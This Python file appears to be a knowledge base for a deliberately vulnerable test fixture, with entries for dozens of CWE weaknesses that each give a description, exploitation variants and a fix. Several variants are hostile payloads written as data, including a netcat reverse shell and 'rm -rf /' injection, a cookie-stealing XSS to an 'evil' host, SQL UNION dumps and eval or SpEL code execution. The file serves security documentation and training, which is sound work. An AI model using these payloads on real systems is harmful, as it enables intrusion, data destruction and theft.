"""
Knowledge base of explanations for every CWE planted in this fixture.

Each entry:
  "what"    -> what the weakness is
  "exploit" -> concrete exploitation variants for the planted sink
  "fix"     -> how to remediate it

Keyed by CWE id (e.g. "CWE-89"). Consumed by build_docs.py to render the
per-vulnerability LaTeX documentation.
"""

KB = {
    "CWE-16": {
        "what": "Insecure or missing security-relevant configuration (framework, server, or app settings left in an unsafe default state).",
        "exploit": [
            "Attacker leverages a misconfigured setting (e.g. debug mode, permissive defaults) to gain information or bypass a control.",
            "Because the setting is global, a single misconfiguration typically affects every request/user.",
        ],
        "fix": "Harden configuration explicitly, follow the framework security baseline, and fail closed rather than open.",
    },
    "CWE-20": {
        "what": "Input is used without validating type, length, range, or format.",
        "exploit": [
            "Send oversized, negative, or malformed values to trigger downstream errors, resource exhaustion, or logic bypass.",
            "Feed unexpected encodings/characters to reach a different code path (often a stepping stone to injection).",
        ],
        "fix": "Validate against an allow-list of expected shape/range on the server side before use.",
    },
    "CWE-22": {
        "what": "Path traversal: user input flows into a file path, letting the attacker escape the intended directory.",
        "exploit": [
            "Supply `../../../../etc/passwd` (or Windows `..\\..\\`) to read arbitrary files.",
            "Use absolute paths, URL-encoded (`%2e%2e%2f`) or null-byte tricks to bypass naive filters.",
            "Write variant: traverse to overwrite config/startup files to achieve code execution.",
        ],
        "fix": "Canonicalize the path and verify it is still under the intended base dir; prefer an allow-list of file ids.",
    },
    "CWE-78": {
        "what": "OS command injection: untrusted input is concatenated into a shell/command invocation.",
        "exploit": [
            "Inject shell metacharacters: `; rm -rf /`, `| nc attacker 4444 -e /bin/sh`, `$(curl evil)`.",
            "Use `&&`, `||`, backticks or `$()` to chain arbitrary commands.",
            "On `Runtime.exec(String)` the string is split naively, so spaces/quotes can be abused.",
        ],
        "fix": "Avoid the shell; use ProcessBuilder with an argument array and a fixed command, validate arguments.",
    },
    "CWE-79": {
        "what": "Cross-site scripting: untrusted input is reflected into HTML/JS without encoding.",
        "exploit": [
            "Reflected: `?q=<script>document.location='//evil/'+document.cookie</script>` to steal sessions.",
            "Use event handlers/`<img onerror>` when `<script>` is filtered.",
            "Escalate to keylogging, CSRF token theft, or full account takeover.",
        ],
        "fix": "Context-aware output encoding (HTML/attr/JS/URL); use a template engine that auto-escapes and set CSP.",
    },
    "CWE-89": {
        "what": "SQL injection: untrusted input is concatenated into a SQL query string.",
        "exploit": [
            "Auth bypass: `' OR '1'='1` in a login field.",
            "Data exfiltration via UNION: `' UNION SELECT username,password FROM users--`.",
            "Blind/time-based extraction with `SLEEP()`/`WAITFOR`; stacked queries for write/DROP.",
        ],
        "fix": "Use parameterized queries / PreparedStatement; never build SQL by string concatenation.",
    },
    "CWE-90": {
        "what": "LDAP injection: untrusted input is placed into an LDAP filter unescaped.",
        "exploit": [
            "Inject `*)(uid=*))(|(uid=*` to broaden the filter and enumerate/bypass auth.",
            "Use `*` wildcards to match all entries; blind extraction of attribute values.",
        ],
        "fix": "Escape LDAP special chars per RFC 4515 or use parameterized LDAP APIs; validate input.",
    },
    "CWE-93": {
        "what": "CRLF injection: carriage-return/line-feed sequences from input are written into a protocol stream.",
        "exploit": [
            "Inject `%0d%0a` to forge headers, split responses, or poison logs.",
            "Add extra headers/set-cookie or smuggle a second response.",
        ],
        "fix": "Strip/reject CR and LF from any value used in headers, logs, or protocol fields.",
    },
    "CWE-94": {
        "what": "Code injection: attacker-controlled data is interpreted as code (script engine, eval, etc.).",
        "exploit": [
            "Supply script source that the engine executes (e.g. `java.lang.Runtime.getRuntime().exec(...)`).",
            "Achieve full remote code execution in the app's process.",
        ],
        "fix": "Do not evaluate untrusted input; sandbox script engines and restrict available classes/APIs.",
    },
    "CWE-113": {
        "what": "HTTP response splitting: CRLF in input used to build a response header.",
        "exploit": [
            "Inject `%0d%0aSet-Cookie: session=attacker` to fixate sessions.",
            "Split off a second, attacker-controlled response body (cache poisoning / XSS).",
        ],
        "fix": "Reject CR/LF in header values; use framework APIs that encode headers safely.",
    },
    "CWE-116": {
        "what": "Output is placed into a context without proper encoding/escaping for that context.",
        "exploit": [
            "Depending on sink, breaks out into HTML, SQL, shell, or a URL and injects payload.",
            "Mismatched encoding (e.g. HTML-encode but sink is JS) still allows injection.",
        ],
        "fix": "Apply encoding matching the exact output context; centralize encoding helpers.",
    },
    "CWE-117": {
        "what": "Log injection: unsanitized input written to logs.",
        "exploit": [
            "Inject newlines to forge fake log entries and hide activity.",
            "Embed ANSI/terminal escapes or payloads that exploit a log viewer/SIEM.",
        ],
        "fix": "Neutralize CR/LF and control chars before logging; log structured fields, not raw strings.",
    },
    "CWE-134": {
        "what": "Uncontrolled format string: user input used as the format specifier.",
        "exploit": [
            "Supply `%x`/`%s`/`%n`-style specifiers (in C) to leak/write memory; in Java, `%n` or bad specifiers cause exceptions/DoS or leak args.",
            "Cause `IllegalFormatException` for DoS or unexpected output.",
        ],
        "fix": "Use a constant format string; pass user data only as arguments.",
    },
    "CWE-158": {
        "what": "Improper neutralization of null bytes in input.",
        "exploit": [
            "Append `%00` to truncate strings and bypass extension/path checks (e.g. `file.jsp%00.png`).",
        ],
        "fix": "Reject null bytes; validate the fully-decoded value.",
    },
    "CWE-190": {
        "what": "Integer overflow/wraparound produces an unexpected small/negative value.",
        "exploit": [
            "Provide values near MAX_INT so arithmetic wraps, bypassing size/bounds checks.",
            "Trigger under-allocation followed by out-of-bounds write, or negative loop counters.",
        ],
        "fix": "Use checked arithmetic (Math.addExact), validate ranges, use wider/big-integer types.",
    },
    "CWE-200": {
        "what": "Sensitive information is exposed to an unauthorized actor.",
        "exploit": [
            "Read leaked data (paths, versions, internal IPs, PII) from responses/errors.",
            "Use disclosed details to plan a targeted follow-up attack.",
        ],
        "fix": "Return only what the client needs; suppress internal details in responses.",
    },
    "CWE-208": {
        "what": "Observable timing discrepancy leaks secret-dependent information.",
        "exploit": [
            "Measure response time of comparisons to recover secrets byte-by-byte (timing side channel).",
        ],
        "fix": "Use constant-time comparison (MessageDigest.isEqual) for secrets/HMACs.",
    },
    "CWE-209": {
        "what": "Error messages expose sensitive internal information.",
        "exploit": [
            "Trigger exceptions to harvest stack traces, SQL, file paths, framework versions.",
            "Map the attack surface from verbose errors.",
        ],
        "fix": "Return generic errors to clients; log details server-side only.",
    },
    "CWE-256": {
        "what": "Passwords stored in plaintext.",
        "exploit": [
            "Any DB/file read (SQLi, backup leak, insider) yields usable credentials directly.",
            "Credential reuse lets the attacker pivot to other services.",
        ],
        "fix": "Store only salted, slow password hashes (bcrypt/scrypt/Argon2).",
    },
    "CWE-259": {
        "what": "A hard-coded password is embedded in source.",
        "exploit": [
            "Extract it from the binary/repo and authenticate directly.",
            "The same secret is shared across all deployments and cannot be rotated easily.",
        ],
        "fix": "Load secrets from a vault/env; never commit them.",
    },
    "CWE-269": {
        "what": "Improper privilege management grants more rights than needed.",
        "exploit": [
            "Abuse over-broad privileges to perform actions outside the intended role.",
            "Escalate from a low-priv account to admin operations.",
        ],
        "fix": "Enforce least privilege; check authorization per action.",
    },
    "CWE-287": {
        "what": "Improper authentication: identity is not correctly verified.",
        "exploit": [
            "Bypass or forge the authentication check to act as another user.",
            "Replay or spoof weak identity tokens.",
        ],
        "fix": "Use a vetted auth framework; verify credentials and tokens robustly.",
    },
    "CWE-295": {
        "what": "Improper certificate validation (TLS trust checks disabled/weak).",
        "exploit": [
            "Man-in-the-middle the connection with a self-signed cert since validation is skipped.",
            "Intercept/modify traffic and steal credentials or tokens.",
        ],
        "fix": "Validate the full chain and hostname; never install trust-all TrustManagers.",
    },
    "CWE-306": {
        "what": "A critical function is reachable without authentication.",
        "exploit": [
            "Call the sensitive endpoint directly with no credentials to perform privileged actions.",
        ],
        "fix": "Require authentication/authorization on every sensitive operation.",
    },
    "CWE-307": {
        "what": "No throttling/lockout on repeated authentication attempts.",
        "exploit": [
            "Brute-force or credential-stuff passwords/OTPs at high rate.",
        ],
        "fix": "Rate-limit, add exponential backoff/lockout and CAPTCHA/MFA.",
    },
    "CWE-312": {
        "what": "Sensitive data stored in cleartext (files, cache, prefs, DB).",
        "exploit": [
            "Read the storage medium to obtain secrets/PII with no cracking needed.",
        ],
        "fix": "Encrypt sensitive data at rest; minimize what you store.",
    },
    "CWE-326": {
        "what": "Encryption strength is inadequate (short keys / weak parameters).",
        "exploit": [
            "Brute-force or cryptanalyze the weak key/parameter to recover plaintext.",
        ],
        "fix": "Use modern algorithms and key sizes (AES-256, RSA>=3072/EC).",
    },
    "CWE-327": {
        "what": "A broken or risky cryptographic algorithm is used (DES, MD5, SHA1, ECB...).",
        "exploit": [
            "Exploit known weaknesses (collisions, small keyspace, ECB pattern leakage) to forge or decrypt.",
        ],
        "fix": "Use vetted primitives: AES-GCM, SHA-256+, HMAC; avoid ECB and legacy ciphers.",
    },
    "CWE-329": {
        "what": "CBC mode used without a random IV (static/predictable IV).",
        "exploit": [
            "Detect identical plaintext blocks/messages; chosen-plaintext attacks recover data.",
        ],
        "fix": "Use a fresh random IV per message (or authenticated modes like GCM).",
    },
    "CWE-330": {
        "what": "Insufficiently random values used where unpredictability is required.",
        "exploit": [
            "Predict tokens/session ids/nonces generated with java.util.Random.",
        ],
        "fix": "Use SecureRandom for all security-sensitive values.",
    },
    "CWE-337": {
        "what": "Predictable seed used to initialize a PRNG.",
        "exploit": [
            "Recompute the seed (e.g. current time) and regenerate all 'random' outputs.",
        ],
        "fix": "Never seed with predictable data; use SecureRandom with OS entropy.",
    },
    "CWE-345": {
        "what": "Insufficient verification of data authenticity/integrity.",
        "exploit": [
            "Tamper with data in transit/storage since integrity is not checked.",
            "Forge messages the app accepts as genuine.",
        ],
        "fix": "Verify signatures/MACs before trusting data.",
    },
    "CWE-347": {
        "what": "Cryptographic signature is not (properly) verified.",
        "exploit": [
            "Forge or alter signed content (e.g. JWT with `alg:none` or unverified signature).",
        ],
        "fix": "Always verify signatures with the expected algorithm and key.",
    },
    "CWE-362": {
        "what": "Race condition: concurrent access to shared state without synchronization.",
        "exploit": [
            "Time parallel requests to corrupt shared data or double-spend/double-use a resource.",
        ],
        "fix": "Synchronize access or use atomic/immutable structures.",
    },
    "CWE-367": {
        "what": "TOCTOU: state checked and then used in separate, non-atomic steps.",
        "exploit": [
            "Swap a file/symlink between the check and the use to access a different resource.",
        ],
        "fix": "Operate atomically on a handle; avoid check-then-use on paths.",
    },
    "CWE-369": {
        "what": "Divide-by-zero from unvalidated operands.",
        "exploit": [
            "Send a zero divisor to throw ArithmeticException and crash the request/thread (DoS).",
        ],
        "fix": "Validate the divisor before dividing.",
    },
    "CWE-377": {
        "what": "Insecure temporary file creation (predictable name, world-readable).",
        "exploit": [
            "Predict/pre-create the temp file (symlink) to read/overwrite its contents (race).",
        ],
        "fix": "Use Files.createTempFile with secure perms; avoid predictable names.",
    },
    "CWE-384": {
        "what": "Session fixation: session id is not rotated after authentication.",
        "exploit": [
            "Plant a known session id in the victim's browser, then hijack it after they log in.",
        ],
        "fix": "Regenerate the session id on privilege change/login.",
    },
    "CWE-434": {
        "what": "Unrestricted file upload allows dangerous file types.",
        "exploit": [
            "Upload a `.jsp`/`.php` webshell and request it to get RCE.",
            "Bypass filters via double extensions, content-type spoofing, or null bytes.",
        ],
        "fix": "Allow-list types, store outside web root, randomize names, verify content.",
    },
    "CWE-470": {
        "what": "Unsafe reflection: class/method name comes from user input.",
        "exploit": [
            "Instantiate arbitrary classes to trigger dangerous side effects or gadget chains.",
        ],
        "fix": "Map input to an allow-list of permitted classes; never reflect raw input.",
    },
    "CWE-476": {
        "what": "Null pointer dereference from unchecked null.",
        "exploit": [
            "Provide input that yields null (missing param/lookup miss) to crash the thread (DoS).",
        ],
        "fix": "Null-check and use Optional; fail gracefully.",
    },
    "CWE-484": {
        "what": "Missing break in a switch causes unintended fall-through.",
        "exploit": [
            "Reach a code path/permission branch not intended for the input value.",
        ],
        "fix": "Add break/return per case or use arrow-form switch.",
    },
    "CWE-489": {
        "what": "Active debug code left in production.",
        "exploit": [
            "Hit debug endpoints/flags to dump state, bypass auth, or run diagnostics.",
        ],
        "fix": "Remove debug code; gate behind build profiles.",
    },
    "CWE-501": {
        "what": "Trust boundary violation: untrusted data placed into a trusted store (e.g. session) unvalidated.",
        "exploit": [
            "Poison session/trusted context so later trusted reads act on attacker data.",
        ],
        "fix": "Validate before crossing into a trusted context.",
    },
    "CWE-502": {
        "what": "Deserialization of untrusted data.",
        "exploit": [
            "Send a crafted serialized object (gadget chain) to achieve RCE on readObject.",
            "Trigger DoS via billion-objects/large graphs.",
        ],
        "fix": "Avoid native deserialization of untrusted input; use safe formats (JSON) with allow-lists.",
    },
    "CWE-521": {
        "what": "Weak password requirements permit trivial passwords.",
        "exploit": [
            "Guess/brute-force short or common passwords quickly.",
        ],
        "fix": "Enforce length/complexity, block breached passwords, encourage MFA.",
    },
    "CWE-532": {
        "what": "Sensitive information written to log files.",
        "exploit": [
            "Read logs (or leak them) to obtain passwords/tokens/PII.",
        ],
        "fix": "Never log secrets; mask/redact sensitive fields.",
    },
    "CWE-548": {
        "what": "Directory listing exposes files that should be hidden.",
        "exploit": [
            "Browse the listing to discover backups, sources, configs, and enumerate the app.",
        ],
        "fix": "Disable auto-indexing; return 404 for directories.",
    },
    "CWE-597": {
        "what": "Wrong operator (== instead of .equals) for String/object comparison.",
        "exploit": [
            "Comparison may fail/succeed based on reference identity, bypassing intended checks (e.g. token compare).",
        ],
        "fix": "Use .equals()/constant-time compare for value equality.",
    },
    "CWE-598": {
        "what": "Sensitive data sent in the URL query string.",
        "exploit": [
            "Harvest secrets from browser history, referer headers, proxy/server logs.",
        ],
        "fix": "Send sensitive data in the body over TLS, not the URL.",
    },
    "CWE-601": {
        "what": "Open redirect: redirect target comes from user input.",
        "exploit": [
            "Craft `?next=//evil.com` links for phishing that appear to originate from the trusted site.",
        ],
        "fix": "Allow-list redirect targets or use relative paths only.",
    },
    "CWE-602": {
        "what": "Server trusts client-side enforced security decisions.",
        "exploit": [
            "Tamper with hidden fields/JS checks/prices in the request; server accepts them.",
        ],
        "fix": "Re-validate and authorize everything on the server.",
    },
    "CWE-611": {
        "what": "XML External Entity (XXE): XML parser resolves external entities.",
        "exploit": [
            "Define an entity pointing at `file:///etc/passwd` to read local files.",
            "SSRF via `http://` entities; DoS via billion-laughs entity expansion.",
        ],
        "fix": "Disable DTDs/external entities on all XML parsers.",
    },
    "CWE-614": {
        "what": "Sensitive cookie set without Secure/HttpOnly flags.",
        "exploit": [
            "Steal the cookie via XSS (no HttpOnly) or over HTTP (no Secure).",
        ],
        "fix": "Set Secure, HttpOnly and SameSite on session cookies.",
    },
    "CWE-617": {
        "what": "Reachable assertion: user input can trigger an assertion/abort.",
        "exploit": [
            "Send input that fails an assert to crash the process/thread (DoS).",
        ],
        "fix": "Handle invalid input with normal error handling, not asserts, in production.",
    },
    "CWE-639": {
        "what": "Authorization bypass via user-controlled key (IDOR).",
        "exploit": [
            "Change an id (`/account?id=124`) to access another user's object.",
            "Enumerate ids to scrape all records.",
        ],
        "fix": "Check that the current principal owns/may access the referenced object.",
    },
    "CWE-643": {
        "what": "XPath injection: input concatenated into an XPath query.",
        "exploit": [
            "Inject `' or '1'='1` to bypass auth or extract nodes.",
            "Blind boolean extraction of the XML document.",
        ],
        "fix": "Use parameterized XPath (variables) and escape/validate input.",
    },
    "CWE-681": {
        "what": "Incorrect numeric conversion between types loses/changes value.",
        "exploit": [
            "Provide values that overflow/truncate on cast to bypass a bounds check.",
        ],
        "fix": "Validate ranges before/after conversion; use appropriate types.",
    },
    "CWE-732": {
        "what": "Incorrect permission assignment for a critical resource (world-writable/readable).",
        "exploit": [
            "Any local user reads secrets or overwrites the resource.",
        ],
        "fix": "Set least-privilege file/resource permissions (e.g. 600/640).",
    },
    "CWE-759": {
        "what": "Password hashed without a salt.",
        "exploit": [
            "Use rainbow tables / precomputed hashes to crack many passwords instantly.",
            "Identical passwords produce identical hashes, aiding cracking.",
        ],
        "fix": "Use per-user salt with a slow KDF (bcrypt/Argon2).",
    },
    "CWE-772": {
        "what": "A resource (stream/connection) is not released on all paths.",
        "exploit": [
            "Repeat the operation to exhaust file handles/connections (DoS).",
        ],
        "fix": "Use try-with-resources / finally to always close.",
    },
    "CWE-789": {
        "what": "Uncontrolled memory allocation driven by input size.",
        "exploit": [
            "Send a huge size/count so the app allocates until OOM (DoS).",
        ],
        "fix": "Cap sizes; validate length/count before allocating.",
    },
    "CWE-798": {
        "what": "Hard-coded credentials (keys/tokens/passwords) in source.",
        "exploit": [
            "Extract the secret from the repo/binary and use it directly.",
        ],
        "fix": "Externalize secrets to a vault/env; rotate leaked ones.",
    },
    "CWE-835": {
        "what": "Loop whose exit condition can never be met (infinite loop).",
        "exploit": [
            "Provide input that hits the non-terminating path to hang a thread (DoS).",
        ],
        "fix": "Ensure loop bounds/termination for all inputs; add timeouts.",
    },
    "CWE-915": {
        "what": "Mass assignment: request binds directly to internal object fields.",
        "exploit": [
            "Add unexpected params (`isAdmin=true`, `role=admin`) to set protected fields.",
        ],
        "fix": "Bind to an explicit DTO / allow-list of settable fields.",
    },
    "CWE-916": {
        "what": "Password hashed with a fast/weak function.",
        "exploit": [
            "GPU-crack fast hashes (MD5/SHA) at billions/sec.",
        ],
        "fix": "Use a slow adaptive KDF (bcrypt/scrypt/Argon2) with salt.",
    },
    "CWE-917": {
        "what": "Expression Language injection (SpEL/OGNL/EL).",
        "exploit": [
            "Inject `${T(java.lang.Runtime).getRuntime().exec(...)}` for RCE.",
        ],
        "fix": "Never evaluate user input as EL; use safe templating with no EL over input.",
    },
    "CWE-918": {
        "what": "Server-Side Request Forgery: server fetches a user-supplied URL.",
        "exploit": [
            "Point it at internal services (`http://169.254.169.254/`, `http://localhost:admin`) to reach cloud metadata/internal APIs.",
            "Use `file://`/`gopher://` schemes for local file read or protocol smuggling.",
        ],
        "fix": "Allow-list destinations, block internal ranges/metadata, disable risky schemes.",
    },
    "CWE-942": {
        "what": "Overly permissive CORS (wildcard/reflected origin with credentials).",
        "exploit": [
            "Malicious site reads authenticated responses cross-origin, exfiltrating data.",
        ],
        "fix": "Allow-list specific origins; never combine `*` with credentials.",
    },
    "CWE-943": {
        "what": "NoSQL injection: input concatenated/embedded into a NoSQL query/object.",
        "exploit": [
            "Inject operator objects like `{\"$ne\": null}` / `{\"$gt\":\"\"}` to bypass auth or dump data.",
            "Use `$where` with JS for server-side evaluation.",
        ],
        "fix": "Use typed query builders/parameterization; reject operator objects from input.",
    },
    "CWE-1021": {
        "what": "Missing anti-framing protection (clickjacking).",
        "exploit": [
            "Frame the site and trick users into clicking hidden actions (UI redress).",
        ],
        "fix": "Set X-Frame-Options: DENY / CSP frame-ancestors.",
    },
    "CWE-1333": {
        "what": "Inefficient regex enabling ReDoS (catastrophic backtracking).",
        "exploit": [
            "Send crafted input that makes the regex backtrack exponentially, pinning CPU (DoS).",
        ],
        "fix": "Use linear-time regex/engines, bound input, avoid nested quantifiers.",
    },
    "CWE-1336": {
        "what": "Server-Side Template Injection: input becomes part of a template.",
        "exploit": [
            "Inject template syntax (`${7*7}`, `#{...}`) that the engine evaluates, often to RCE.",
        ],
        "fix": "Never render user input as template source; pass it as data only.",
    },
    # --- Python-specific / extended entries ---
    "CWE-95": {
        "what": "Eval injection: untrusted input is passed to a dynamic-evaluation primitive (eval/exec/compile), so the attacker's data is executed as code.",
        "exploit": [
            "Supply `__import__('os').system('id')` to run arbitrary OS commands.",
            "Use `().__class__.__bases__[0].__subclasses__()` gadget chains to escape restricted eval namespaces.",
            "Read/exfiltrate secrets: `open('/etc/passwd').read()` inside the evaluated expression.",
        ],
        "fix": "Never eval/exec untrusted input. Parse with ast.literal_eval for data, or use an explicit allow-listed dispatch table.",
    },
    "CWE-88": {
        "what": "Argument injection: untrusted input becomes an argument to an external program, letting the attacker inject extra flags/options that change the program's behavior.",
        "exploit": [
            "Pass a value beginning with `-` or `--` to smuggle dangerous flags (e.g. git's `--upload-pack`, tar's `--to-command`).",
            "Turn a benign command into code execution by injecting an option that runs a helper.",
        ],
        "fix": "Validate/allow-list argument values, use `--` to terminate option parsing, and never let user input start an option token.",
    },
    "CWE-352": {
        "what": "Cross-Site Request Forgery: a state-changing request is accepted without proof it was intentionally sent by the authenticated user.",
        "exploit": [
            "Host an auto-submitting form / `<img>` on an attacker page that fires the victim's authenticated request.",
            "Change email/password or transfer funds using the victim's ambient cookies.",
        ],
        "fix": "Require a per-session anti-CSRF token on state-changing requests and set cookies SameSite=Lax/Strict.",
    },
    "CWE-478": {
        "what": "Missing/mishandled default branch: a multi-way selection lacks a safe default, so unexpected inputs fall into an unintended (often over-permissive) branch.",
        "exploit": [
            "Send a value not covered by the explicit cases to hit the permissive fallback (e.g. gain extra permissions).",
            "Combine with weak input validation to reach a privileged code path.",
        ],
        "fix": "Provide an explicit, deny-by-default branch; fail closed on unknown inputs.",
    },
    "CWE-644": {
        "what": "Improper neutralization of HTTP headers: a client-controlled header (e.g. Host) is trusted when building URLs/links or making decisions.",
        "exploit": [
            "Poison a password-reset link via a forged Host header so the token is sent to an attacker domain.",
            "Cache poisoning / routing abuse using a spoofed Host or X-Forwarded-* header.",
        ],
        "fix": "Use a configured canonical host/base URL; validate Host against an allow-list; never build security-relevant URLs from request headers.",
    },
    "CWE-776": {
        "what": "XML entity expansion (billion-laughs): nested/recursive entity definitions expand exponentially, exhausting CPU and memory.",
        "exploit": [
            "Upload an XML doc with deeply nested entities to exhaust memory and DoS the service.",
            "Combine with external entities (XXE) for file read plus resource exhaustion.",
        ],
        "fix": "Disable DTD/entity processing (e.g. defusedxml, forbid_dtd=True); cap entity expansion and input size.",
    },
    "CWE-1275": {
        "what": "Sensitive cookie without the SameSite attribute, leaving it attachable to cross-site requests and exposing the session to CSRF.",
        "exploit": [
            "Trigger cross-site state-changing requests that carry the cookie automatically.",
            "Chain with CSRF to perform actions as the victim.",
        ],
        "fix": "Set SameSite=Lax or Strict on session/auth cookies, plus Secure and HttpOnly.",
    },
}
